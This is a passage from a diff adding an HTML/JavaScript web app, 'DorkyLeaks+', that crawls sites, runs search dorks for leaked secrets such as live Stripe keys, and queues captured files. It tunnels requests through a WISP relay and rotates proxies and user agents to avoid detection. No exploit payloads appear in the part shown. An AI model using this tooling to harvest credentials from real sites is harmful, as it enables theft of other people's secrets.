@@ -1,0 +1,3396 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<title>DorkyLeaks+</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
+:root{--bg:#000;--s:#0c0c0c;--b:#1f1f1f;--t:#fff;--d:#8a8a8a;--ok:#22c55e;--bad:#ef4444;--warn:#f59e0b;--r:16px;--purple:#a78bfa}
+html,body{background:var(--bg)}
+body{color:var(--t);font:15px/1.4 -apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;max-width:900px;margin:auto;padding:0 16px calc(32px + env(safe-area-inset-bottom))}
+header{position:sticky;top:0;z-index:5;background:rgba(0,0,0,.88);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);padding:calc(14px + env(safe-area-inset-top)) 0 12px;display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+h1{font-size:26px;font-weight:800;letter-spacing:-1.2px;flex:none}
+h1 span{color:var(--d)}
+.header-badges{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.hbadge{font-size:11px;font-weight:700;border:1px solid var(--b);background:var(--s);padding:3px 9px;border-radius:99px;color:var(--d)}
+.hbadge.warn{color:var(--warn);border-color:var(--warn)}
+.live{font-size:13px;font-weight:600;border:1px solid var(--b);background:var(--s);padding:6px 12px;border-radius:99px;display:flex;align-items:center;gap:7px}
+.live i{width:7px;height:7px;border-radius:50%;background:var(--d);display:block}
+.live.on i{background:var(--t);animation:p 1s infinite}
+.live.ok i{background:var(--ok);animation:none}
+.live.bad i{background:var(--bad);animation:none}
+@keyframes p{50%{opacity:.2}}
+.prog{background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:14px 16px;margin-bottom:12px;display:none}
+.prog.show{display:block}
+.prog .row{display:flex;justify-content:space-between;font-size:13px;margin-bottom:10px;gap:10px}
+.prog .row span:first-child{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.prog .row span:last-child{color:var(--d);font-variant-numeric:tabular-nums;flex:none}
+.prog.paused .fill{background:var(--d)}
+.track{height:8px;background:#1a1a1a;border-radius:99px;overflow:hidden}
+.fill{height:100%;width:0;background:var(--t);border-radius:99px;transition:width .35s ease}
+.progbtns{display:flex;gap:6px;margin-top:10px}
+.progbtns .btn{font-size:12px;padding:8px 12px;flex:1}
+.seg{display:flex;background:var(--s);border:1px solid var(--b);border-radius:12px;padding:3px;margin-bottom:10px;overflow-x:auto;scrollbar-width:none;gap:2px}
+.seg::-webkit-scrollbar{display:none}
+.seg button{flex:1;min-width:58px;border:0;background:none;color:var(--d);font:inherit;font-size:12px;font-weight:600;padding:8px 0;border-radius:9px;cursor:pointer;white-space:nowrap}
+.seg button.on{background:var(--t);color:var(--bg)}
+.tab{display:none}.tab.on{display:block}
+.field{background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:12px 14px;margin-bottom:8px}
+.field label{display:block;font-size:11.5px;color:var(--d);text-transform:uppercase;letter-spacing:.6px;font-weight:700;margin-bottom:6px}
+.field input[type=text],.field input[type=url],.field input[type=number],.field textarea{width:100%;background:none;border:0;color:var(--t);font:inherit;font-size:14px;outline:none;resize:vertical}
+.field input[type=number]{-moz-appearance:textfield;appearance:textfield}
+.field input[type=number]::-webkit-outer-spin-button,.field input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;appearance:none;margin:0}
+.field textarea{font:12.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:100px;display:block;padding:0}
+.field-row{display:flex;gap:8px;align-items:center}
+.field-row input{flex:1}
+.badge{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:10px 14px;margin-bottom:8px;font-size:12.5px;color:var(--d);line-height:1.5}
+.badge b{color:var(--t);font-weight:600}
+.hint{color:var(--d);font-size:12.5px;margin-bottom:14px;line-height:1.5}
+.drop{border:1.5px dashed var(--b);border-radius:var(--r);padding:44px 20px;text-align:center;cursor:pointer;margin-bottom:12px}
+.drop:active,.drop.over{background:var(--s);border-color:var(--t)}
+.drop b{display:block;font-size:15px;margin-bottom:4px}
+.drop small{color:var(--d);font-size:12.5px}
+.btn{border:1px solid var(--b);background:var(--s);color:var(--t);font:inherit;font-size:14px;font-weight:600;padding:11px 16px;border-radius:12px;cursor:pointer;transition:.15s}
+.btn.pri{background:var(--t);color:var(--bg);border-color:var(--t)}
+.btn.acc{background:#1d1229;border-color:var(--purple);color:var(--purple)}
+.btn.danger{background:#1a0606;border-color:var(--bad);color:var(--bad)}
+.btn:active{transform:scale(.97)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
+.bar .btn{flex:1;min-width:80px;font-size:13px;padding:10px 12px}
+.list{display:flex;flex-direction:column;gap:8px;margin-bottom:12px}
+.card{display:flex;align-items:center;gap:12px;background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:12px 14px;cursor:pointer}
+.card .fl{font-size:22px;width:32px;text-align:center;flex:none}
+.card .mid{flex:1;min-width:0}
+.card .ad{font:600 13.5px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.card .sub{color:var(--d);font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
+.card .rt{text-align:right;flex:none}
+.tag{display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;border:1px solid #333;padding:2px 8px;border-radius:99px}
+.tag.crit{border-color:var(--t);background:var(--t);color:var(--bg)}
+.tag.vuln{border-color:var(--bad);background:var(--bad);color:var(--t)}
+.tag.gw{border-color:#8b5cf6;color:var(--purple)}
+.tag.warn{border-color:var(--warn);color:var(--warn)}
+.empty{text-align:center;color:var(--d);padding:48px 0}
+.empty .g{font-size:32px;opacity:.4;margin-bottom:10px}
+.term-wrap{background:#050505;border:1px solid #1a1a1a;border-radius:10px;overflow:hidden;margin-top:8px;box-shadow:inset 0 0 30px rgba(0,255,120,.04)}
+.term-bar{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;background:#0a0a0a;border-bottom:1px solid #151515;font:11px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:#5a5a5a}
+.term-bar .dts{display:flex;gap:6px;align-items:center}
+.term-bar .dot{width:9px;height:9px;border-radius:50%}
+.term-bar .dot.r{background:#ef4444}.term-bar .dot.y{background:#f59e0b}.term-bar .dot.g{background:#22c55e}
+.term-bar .cnt{font-variant-numeric:tabular-nums}
+.log{background:transparent;padding:10px 12px;font:11px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,"Courier New",monospace;color:#c8c8c8;height:min(70vh,520px);overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.log::-webkit-scrollbar{width:6px}.log::-webkit-scrollbar-track{background:#0a0a0a}.log::-webkit-scrollbar-thumb{background:#222;border-radius:3px}
+.log div{padding:0}
+.log .dim{color:#5a5a5a}.log .ok{color:#d0d0d0}.log .hit{color:#4ade80}.log .bad{color:#ef4444}
+.log .warn{color:#f59e0b}.log .gw{color:#a78bfa}.log .hdr{color:#7dd3fc;font-weight:600}
+.log .vuln{color:#ef4444;font-weight:600}.log .req{color:#7c8ea0}.log .res2{color:#b8d4b8}
+.log .res3{color:#e0c080}.log .res4{color:#e08080}.log .cook{color:#a080e0}.log .pay{color:#ff9a4a}
+.log .proxy{color:#c0a0e0}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;margin-bottom:14px}
+.stat{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:12px 14px}
+.stat .n{font-size:22px;font-weight:800}
+.stat .l{font-size:10.5px;color:var(--d);text-transform:uppercase;letter-spacing:.6px;margin-top:2px;font-weight:700}
+.group{margin-bottom:16px}
+.gh{display:flex;justify-content:space-between;align-items:baseline;padding:0 4px 8px}
+.gh h4{font-size:13px;font-weight:700}
+.gh .c{color:var(--d);font-size:12px}
+.settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+@media(max-width:560px){.settings-grid{grid-template-columns:1fr}}
+.proxy-row{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.proxy-dot{width:9px;height:9px;border-radius:50%;background:var(--d);flex:none}
+.proxy-dot.checking{background:var(--warn)}
+.proxy-dot.ready{background:var(--ok)}
+.proxy-dot.none{background:var(--bad)}
+.proxy-badge{font-size:11px;font-weight:700;border:1px solid #333;padding:2px 9px;border-radius:99px;color:var(--d)}
+.proxy-badge.ready{color:var(--ok);border-color:var(--ok)}
+.proxy-badge.none{color:var(--bad);border-color:var(--bad)}
+.wisp-dot{width:9px;height:9px;border-radius:50%;background:var(--d);flex:none;display:inline-block}
+.wisp-dot.connected{background:var(--ok)}
+.wisp-dot.error{background:var(--bad)}
+.mod-card{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:12px 14px;margin-bottom:8px;display:flex;flex-direction:column;gap:8px}
+.mod-head{display:flex;justify-content:space-between;align-items:center;gap:10px}
+.mod-name{font-size:13.5px;font-weight:700}
+.mod-desc{font-size:11.5px;color:var(--d);line-height:1.4}
+.mod-run-btn{font-size:12.5px;padding:8px 14px;align-self:flex-start}
+.mod-status{font-size:10.5px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;border:1px solid #333;padding:2px 8px;border-radius:99px;color:var(--d);flex:none}
+.mod-status.idle{border-color:#333;color:var(--d)}
+.mod-status.running{border-color:var(--warn);color:var(--warn)}
+.mod-status.done{border-color:var(--ok);color:var(--ok)}
+.mod-status.error{border-color:var(--bad);color:var(--bad)}
+.dq-item{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:12px 14px;margin-bottom:8px}
+.dq-item.selected{border-color:var(--t)}
+.dq-row{display:flex;align-items:flex-start;gap:10px}
+.dq-chk{width:18px;height:18px;accent-color:var(--t);flex:none;margin-top:3px;cursor:pointer}
+.dq-meta{flex:1;min-width:0}
+.dq-name{font:600 13px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:3px;cursor:pointer}
+.dq-pills{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:5px}
+.dq-pill{font-size:10.5px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;border:1px solid #333;padding:2px 7px;border-radius:99px;color:var(--d)}
+.dq-pill.hot{border-color:var(--bad);color:var(--bad)}
+.dq-pill.warn{border-color:var(--warn);color:var(--warn)}
+.dq-pill.ok{border-color:var(--ok);color:var(--ok)}
+.dq-preview{font:10.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:#7c8ea0;background:#060606;border:1px solid #181818;border-radius:7px;padding:7px 9px;white-space:pre-wrap;word-break:break-all;max-height:72px;overflow:hidden;margin-top:4px}
+.dq-actions{display:flex;gap:6px;margin-top:8px}
+.dq-actions .btn{font-size:11.5px;padding:6px 11px;flex:none}
+.dq-badge{background:var(--bad);color:#fff;font-size:10px;font-weight:800;border-radius:99px;padding:1px 6px;margin-left:5px;vertical-align:1px}
+.fv-overlay{position:fixed;inset:0;z-index:30;background:rgba(0,0,0,.92);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:flex;align-items:flex-end;justify-content:center}
+.fv-overlay.hidden{display:none}
+.fv-sheet{background:var(--bg);border:1px solid var(--b);border-radius:20px 20px 0 0;width:100%;max-width:900px;max-height:94vh;display:flex;flex-direction:column}
+.fv-hdr{display:flex;justify-content:space-between;align-items:flex-start;padding:16px 18px 12px;border-bottom:1px solid var(--b);flex-shrink:0;gap:12px}
+.fv-hdr-meta{flex:1;min-width:0}
+.fv-title{font:700 14px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:3px}
+.fv-sub{font-size:12px;color:var(--d)}
+.fv-close{padding:7px 13px;font-size:13px}
+.fv-body{flex:1;overflow-y:auto;padding:0}
+.fv-code{font:11.5px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:#c8c8c8;background:#050505;padding:14px 16px;white-space:pre-wrap;word-break:break-all;min-height:200px}
+.fv-hit{background:rgba(239,68,68,.18);color:#fca5a5;border-radius:2px;padding:0 2px}
+.fv-findings{padding:12px 16px;border-bottom:1px solid var(--b);display:flex;gap:6px;flex-wrap:wrap;flex-shrink:0}
+.fv-foot{padding:12px 14px;border-top:1px solid var(--b);display:flex;gap:8px;flex-shrink:0}
+.fv-foot .btn{flex:1;font-size:13px;padding:11px 12px}
+.toast{position:fixed;left:50%;bottom:calc(24px + env(safe-area-inset-bottom));transform:translate(-50%,20px);background:var(--t);color:var(--bg);font-weight:600;font-size:13px;padding:10px 18px;border-radius:99px;opacity:0;transition:.25s;pointer-events:none;z-index:10;max-width:90vw;text-align:center}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid currentColor;border-right-color:transparent;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/fflate@0.8.2/umd/index.js"></script>
+</head>
+<body>
+
+<header>
+  <h1>DorkyLeaks<span>+</span></h1>
+  <div class="header-badges">
+    <span class="hbadge" id="moduleCountBadge">0 modules</span>
+    <span class="hbadge warn">Authorized use only</span>
+  </div>
+  <div class="live" id="live"><i></i><span id="liveTxt">idle</span></div>
+</header>
+
+<div class="prog" id="prog">
+  <div class="row"><span id="ptxt">Idle</span><span id="ppct">0%</span></div>
+  <div class="track"><div class="fill" id="fill"></div></div>
+  <div class="progbtns">
+    <button class="btn" id="pauseBtn" disabled>Pause</button>
+    <button class="btn" id="stopBtn" disabled>Stop</button>
+  </div>
+</div>
+
+<div class="seg" id="seg">
+  <button class="on" data-tab="crawl">Crawl</button>
+  <button data-tab="dork">Dork</button>
+  <button data-tab="files">Files</button>
+  <button data-tab="modules">Modules</button>
+  <button data-tab="paths">Paths</button>
+  <button data-tab="settings">Settings</button>
+  <button data-tab="results">Results</button>
+  <button data-tab="queue">Queue<span id="queueBadge" class="dq-badge" style="display:none">0</span></button>
+</div>
+
+<section class="tab on" id="tab-crawl">
+  <div class="field"><label>Target URL</label><input type="url" id="crawlUrl" placeholder="https://example.com" autocomplete="off" inputmode="url"></div>
+  <div class="badge"><b>Ultra-verbose pipeline.</b> Every request, response, redirect, cookie, payload, nonce, form field, gateway signature and scanner pass is printed live below.</div>
+  <div class="bar" style="margin-top:12px">
+    <button class="btn pri" id="crawlGo">Start crawl</button>
+    <button class="btn" id="crawlClear">Clear</button>
+  </div>
+  <div class="term-wrap">
+    <div class="term-bar"><div class="dts"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span>dorkyleaks — crawl</span></div><span class="cnt" id="crawlCnt">0 lines</span></div>
+    <div class="log" id="crawlLog"></div>
+  </div>
+</section>
+
+<section class="tab" id="tab-dork">
+  <div class="field"><label>PublicWWW query</label><input type="text" id="dorkQ" placeholder='e.g. "sk_live_" filetype:env' autocomplete="off"></div>
+  <div class="field"><label>Max URLs</label><input type="number" id="dorkMax" value="100" min="1" max="5000"></div>
+  <div class="badge">Same ultra-verbose pipeline per exported domain.</div>
+  <div class="bar" style="margin-top:12px">
+    <button class="btn pri" id="dorkGo">Run dork</button>
+    <button class="btn" id="dorkClear">Clear</button>
+  </div>
+  <div class="term-wrap">
+    <div class="term-bar"><div class="dts"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span>dorkyleaks — dork</span></div><span class="cnt" id="dorkCnt">0 lines</span></div>
+    <div class="log" id="dorkLog"></div>
+  </div>
+</section>
+
+<section class="tab" id="tab-files">
+  <div class="drop" id="drop"><b>Drop files here</b><small>or tap to browse — scan happens locally</small></div>
+  <input type="file" id="fileInput" multiple hidden>
+  <div class="list" id="fileList"></div>
+  <div class="bar">
+    <button class="btn" id="clearFiles">Clear files</button>
+    <button class="btn pri" id="scanFiles">Scan</button>
+  </div>
+</section>
+
+<section class="tab" id="tab-modules">
+  <div class="badge"><b>Module scanner.</b> Individual security checks — WISP transport from Settings. Modules needing parameters auto-run the crawler first.</div>
+  <div class="field"><label>Target URL</label><input type="url" id="moduleTargetUrl" placeholder="https://example.com" autocomplete="off" inputmode="url"></div>
+  <div class="bar">
+    <button class="btn pri" id="btnRunAll">Run All Modules</button>
+    <button class="btn danger" id="btnModuleStop" disabled>Stop</button>
+    <button class="btn" id="btnModuleClear">Clear</button>
+  </div>
+  <div class="track" style="margin-bottom:12px"><div class="fill" id="moduleFill"></div></div>
+  <div id="moduleList"></div>
+  <div class="term-wrap" style="margin-top:12px">
+    <div class="term-bar"><div class="dts"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span>dorkyleaks — modules</span></div><span class="cnt" id="moduleCnt">0 lines</span></div>
+    <div class="log" id="moduleLog"></div>
+  </div>
+  <div id="moduleSummary" style="margin-top:14px"></div>
+</section>
+
+<section class="tab" id="tab-paths">
+  <div class="hint">One path per line. <code>#</code> starts a comment.</div>
+  <div class="field"><textarea id="pathsEditor" spellcheck="false"></textarea></div>
+  <div class="bar">
+    <button class="btn" id="pathsReset">Reset default</button>
+    <button class="btn pri" id="pathsSave">Save</button>
+  </div>
+  <div class="hint" id="pathsCount"></div>
+</section>
+
+<section class="tab" id="tab-settings">
+  <div class="badge"><b>Connection settings</b> apply to all crawl, dork, and module scans.</div>
+  <div class="settings-grid">
+    <div>
+      <div class="field">
+        <label>WISP Server URL</label>
+        <div class="field-row">
+          <span class="wisp-dot" id="wispDot"></span>
+          <input type="text" id="wispUrl" placeholder="wss://wisp.mercurywork.shop/" autocomplete="off">
+        </div>
+      </div>
+      <div class="field"><label>Request Timeout (ms)</label><input type="number" id="reqTimeout" value="20000" min="1000" max="120000"></div>
+      <div class="field"><label>Concurrency</label><input type="number" id="concurrency" value="10" min="1" max="40"></div>
+      <div class="field"><label>User-Agent</label><input type="text" id="userAgentInput" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"></div>
+      <div class="field"><label>Extra Headers (JSON)</label><textarea id="extraHeaders" style="min-height:60px" placeholder='{"X-Custom":"value"}'></textarea></div>
+    </div>
+    <div>
+      <div class="field">
+        <label>Rotating Proxies</label>
+        <div class="proxy-row">
+          <span class="proxy-dot" id="proxyDot"></span>
+          <span class="proxy-badge" id="proxyBadge">not loaded</span>
+          <label style="margin:0;display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer;margin-left:auto">
+            <input type="checkbox" id="proxyEnabled" disabled> Use proxies
+          </label>
+        </div>
+        <input type="text" id="proxyListUrl" value="https://thordata.github.io/awesome-free-proxy-list/data/links/http.txt" style="width:100%;background:none;border:0;color:var(--t);font:12px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;outline:none;margin-top:6px" placeholder="Proxy list URL">
+      </div>
+      <div class="bar">
+        <button class="btn acc" id="btnLoadProxies">Load &amp; Validate Proxies</button>
+      </div>
+    </div>
+  </div>
+  <hr class="div">
+  <div class="bar">
+    <button class="btn pri" id="settingsSave">Save &amp; Reconnect</button>
+    <button class="btn" id="settingsReset">Reset defaults</button>
+  </div>
+</section>
+
+<section class="tab" id="tab-results">
+  <div class="bar">
+    <button class="btn" id="exportJson">Export JSON</button>
+    <button class="btn" id="exportTxt">Export TXT</button>
+    <button class="btn" id="clearResults">Clear</button>
+  </div>
+  <div id="resultsBody"><div class="empty"><div class="g">◇</div>No findings yet</div></div>
+</section>
+
+<section class="tab" id="tab-queue">
+  <div class="hint">Files captured during scans. Preview, inspect findings, delete junk, then export as a zip with full report.</div>
+  <div class="bar">
+    <button class="btn" id="queueSelectAll">All</button>
+    <button class="btn" id="queueSelectNone">None</button>
+    <button class="btn" id="queueSelectHot">Hits only</button>
+    <button class="btn" id="queueDeleteSel">Delete selected</button>
+    <button class="btn pri" id="queueExportZip">Export zip</button>
+  </div>
+  <div id="queueList"><div class="empty"><div class="g">◇</div>Nothing queued yet</div></div>
+</section>
+
+<div class="fv-overlay hidden" id="fvOverlay">
+  <div class="fv-sheet">
+    <div class="fv-hdr">
+      <div class="fv-hdr-meta">
+        <div class="fv-title" id="fvTitle"></div>
+        <div class="fv-sub" id="fvSub"></div>
+      </div>
+      <button class="btn fv-close" id="fvClose">x</button>
+    </div>
+    <div class="fv-findings" id="fvFindings"></div>
+    <div class="fv-body" id="fvBody"></div>
+    <div class="fv-foot">
+      <button class="btn" id="fvDelete">Delete file</button>
+      <button class="btn" id="fvRescan">Re-scan</button>
+      <button class="btn pri" id="fvKeep">Keep &amp; close</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast">copied</div>
+
+<script id="worker-src" type="text/plain">
+function workerMain() {
+  let L;
+  const to = (p, ms) => Promise.race([p, new Promise((_, j) => setTimeout(() => j(0), ms))]);
+  self._jar = new Map();
+  const absorbCookies = sc => {
+    if (!sc) return;
+    for (const chunk of String(sc).split(/,(?=\s*[A-Za-z0-9_-]+\s*=)/)) {
+      const kv = chunk.split(';')[0].trim(); if (!kv) continue;
+      const eq = kv.indexOf('=');
+      if (eq > 0) self._jar.set(kv.slice(0, eq), kv.slice(eq + 1));
+    }
+  };
+  const jarHeader = () => [...self._jar.entries()].map(([k, v]) => k + '=' + v).join('; ');
+  self.onmessage = async e => {
+    const m = e.data;
+    if (m.t === 'init') {
+      try { importScripts(m.lib); L = self.libcurl; if (!L) throw new Error('libcurl global missing'); await L.load_wasm(); }
+      catch (e1) {
+        try { ({ libcurl: L } = await import(m.libm)); await L.load_wasm(); }
+        catch (e2) { return postMessage({ t: 'ready', ok: false, why: 'load: ' + ((e1 && e1.message) || e1) + ' | ' + ((e2 && e2.message) || e2) }); }
+      }
+      let tried = '';
+      for (const w of m.wisp) {
+        try {
+          L.set_websocket(w);
+          await Promise.any(m.probes.map(u => to(L.fetch(u), 12000).then(r => { if (!r || typeof r.status !== 'number') throw 0; })));
+          return postMessage({ t: 'ready', ok: true, wisp: w });
+        } catch { tried += ' ' + w; }
+      }
+      postMessage({ t: 'ready', ok: false, why: 'wisp:' + tried });
+    } else if (m.t === 'req') {
+      const t0 = performance.now();
+      try {
+        const headers = { ...(m.headers || {}) };
+        const jar = jarHeader();
+        if (jar && !headers.Cookie) headers.Cookie = jar;
+        else if (jar && headers.Cookie) headers.Cookie = headers.Cookie + '; ' + jar;
+        if (m.cookie) headers.Cookie = headers.Cookie ? headers.Cookie + '; ' + m.cookie : m.cookie;
+        const init = { headers, redirect: m.redirect || 'follow' };
+        if (m.method) init.method = m.method;
+        if (m.body !== undefined && m.body !== null) init.body = m.body;
+        const r = await to(L.fetch(m.url, init), m.ms || 25000);
+        const ms = Math.round(performance.now() - t0);
+        if (!r || typeof r.status !== 'number') return postMessage({ t: 'got', id: m.id, text: '', status: 0, ct: '', setCookie: '', loc: '', ms });
+        const text = await r.text();
+        const g = k => (r.headers && (r.headers.get ? r.headers.get(k) : r.headers[k])) || '';
+        const sc = g('set-cookie'); absorbCookies(sc);
+        postMessage({ t: 'got', id: m.id, text, status: r.status, ct: g('content-type'), url: m.url, setCookie: sc, loc: g('location'), acao: g('access-control-allow-origin'), ms, finalUrl: r.url || m.url });
+      } catch (e) {
+        postMessage({ t: 'got', id: m.id, text: '', status: 0, ct: '', setCookie: '', loc: '', err: String(e && e.message || e), ms: Math.round(performance.now() - t0) });
+      }
+    }
+  };
+}
+</script>
+
+<script type="module">
+const WORKER_SRC = document.getElementById('worker-src').textContent;
+
+/* ===== CONFIG ===== */
+const LIBCURL = 'https://cdn.jsdelivr.net/npm/libcurl.js@0.7/libcurl_full.js';
+const LIBCURL_M = LIBCURL.replace(/\.js$/, '.mjs');
+const WISP_PARAM = (new URLSearchParams(location.search).get('wisp') || '').split(',').map(x => x.trim()).filter(Boolean);
+const WISP_DEFAULT = ['wss://wisp.mercurywork.shop/'];
+const PROBES = ['http://example.com/', 'http://httpbin.org/ip'];
+const WORKERS = 4, CRAWL_MAX = 200, CRAWL_CONC = 20, PROBE_CONC = 40, VULN_CONC = 20, MAX_FILE = 50 * 1024 * 1024;
+const USER_AGENTS = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+];
+const ua = () => USER_AGENTS[(Math.random() * USER_AGENTS.length) | 0];
+
+const getSetting = (id, fallback) => { const el = document.getElementById(id); return el ? (el.value.trim() || fallback) : fallback; };
+const getTimeout = () => parseInt(getSetting('reqTimeout', '20000'), 10) || 20000;
+const getConc = () => Math.max(1, Math.min(40, parseInt(getSetting('concurrency', '10'), 10) || 10));
+const getUA = () => getSetting('userAgentInput', ua());
+const getExtraHdrs = () => { try { return JSON.parse(getSetting('extraHeaders', '{}') || '{}'); } catch { return {}; } };
+
+/* ===== WISP CLIENT ===== */
+const WISP_CONNECT = 0x01, WISP_DATA = 0x02, WISP_CLOSE = 0x04;
+class WISPClient {
+  constructor(u) { this.serverUrl = u; this.ws = null; this.streamCounter = 1; this.streams = new Map(); this.connectPromise = null; this.ready = false; }
+  connect() {
+    if (this.connectPromise) return this.connectPromise;
+    this.connectPromise = new Promise((res, rej) => {
+      this.ws = new WebSocket(this.serverUrl);
+      this.ws.binaryType = 'arraybuffer';
+      this.ws.addEventListener('open', () => { this.ready = true; res(); });
+      this.ws.addEventListener('error', () => { this.ready = false; rej(new Error('WISP error')); });
+      this.ws.addEventListener('close', () => { this.ready = false; for (const [, s] of this.streams) s.reject(new Error('WISP closed')); this.streams.clear(); });
+      this.ws.addEventListener('message', e => this._onMessage(e));
+    });
+    return this.connectPromise;
+  }
+  _onMessage(e) {
+    const buf = new Uint8Array(e.data);
+    if (buf.length < 5) return;
+    const type = buf[0], sid = new DataView(buf.buffer).getUint32(1, true), payload = buf.slice(5);
+    const st = this.streams.get(sid); if (!st) return;
+    if (type === WISP_DATA) { st.chunks.push(payload); st._check(); }
+    else if (type === WISP_CLOSE) { st._fin(); }
+  }
+  request(method, url, hdrs = {}, timeout = 15000) {
+    return new Promise(async (res, rej) => {
+      if (!this.ready) { try { await this.connect(); } catch (e) { return rej(e); } }
+      const p = new URL(url);
+      const host = p.hostname, port = p.port ? parseInt(p.port) : (p.protocol === 'https:' ? 443 : 80);
+      const path = p.pathname + (p.search || '');
+      const sid = this.streamCounter++;
+      const hb = new TextEncoder().encode(host), cb = new Uint8Array(3 + hb.length);
+      cb[0] = 0x01; new DataView(cb.buffer).setUint16(1, port, true); cb.set(hb, 3);
+      this._send(WISP_CONNECT, sid, cb);
+      const reqLines = [method + ' ' + (path || '/') + ' HTTP/1.1', 'Host: ' + host, 'Connection: close'].concat(Object.entries(hdrs).map(([k, v]) => k + ': ' + v), ['', '']);
+      this._send(WISP_DATA, sid, new TextEncoder().encode(reqLines.join('\r\n')));
+      const st = { chunks: [], reject: rej, _timer: setTimeout(() => { this.streams.delete(sid); this._send(WISP_CLOSE, sid, new Uint8Array([1])); rej(new Error('WISP timeout')); }, timeout) };
+      st._check = function () {
+        const tot = this.chunks.reduce((a, c) => a + c.length, 0);
+        const joined = new Uint8Array(tot); let o = 0;
+        for (const c of this.chunks) { joined.set(c, o); o += c.length; }
+        const txt = new TextDecoder().decode(joined), sep = txt.indexOf('\r\n\r\n');
+        if (sep === -1) return;
+        const cl = (txt.slice(0, sep).match(/content-length:\s*(\d+)/i) || [])[1];
+        if (cl !== undefined && txt.slice(sep + 4).length >= parseInt(cl)) this._fin();
+      }.bind(st);
+      st._fin = function () {
+        clearTimeout(this._timer); this._wisp.streams.delete(this._sid);
+        const tot = this.chunks.reduce((a, c) => a + c.length, 0);
+        const joined = new Uint8Array(tot); let o = 0;
+        for (const c of this.chunks) { joined.set(c, o); o += c.length; }
+        const txt = new TextDecoder('utf-8', { fatal: false }).decode(joined);
+        const sep = txt.indexOf('\r\n\r\n');
+        if (sep === -1) { res({ status: 0, headers: {}, text: txt, ok: false }); return; }
+        const hl = txt.slice(0, sep).split('\r\n');
+        const sc = parseInt(((hl[0] || '').match(/\s(\d{3})\s/) || [, 0])[1]) || 0;
+        const hd = {};
+        for (const l of hl.slice(1)) { const ci = l.indexOf(':'); if (ci > -1) hd[l.slice(0, ci).trim().toLowerCase()] = l.slice(ci + 1).trim(); }
+        res({ status: sc, headers: hd, text: txt.slice(sep + 4), ok: sc >= 200 && sc < 400 });
+      }.bind(st);
+      st._wisp = this; st._sid = sid;
+      this.streams.set(sid, st);
+    });
+  }
+  _send(type, sid, payload) {
+    const f = new Uint8Array(5 + payload.length);
+    f[0] = type; new DataView(f.buffer).setUint32(1, sid, true); f.set(payload, 5);
+    this.ws.send(f.buffer);
+  }
+  disconnect() { if (this.ws) this.ws.close(); this.ready = false; this.connectPromise = null; }
+}
+
+/* ===== PROXY ===== */
+let proxyList = [], proxyIndex = 0, proxyChecking = false, wispClient = null;
+function setProxyStatus(cls, text) {
+  const dot = document.getElementById('proxyDot'), badge = document.getElementById('proxyBadge');
+  if (dot) dot.className = 'proxy-dot ' + cls;
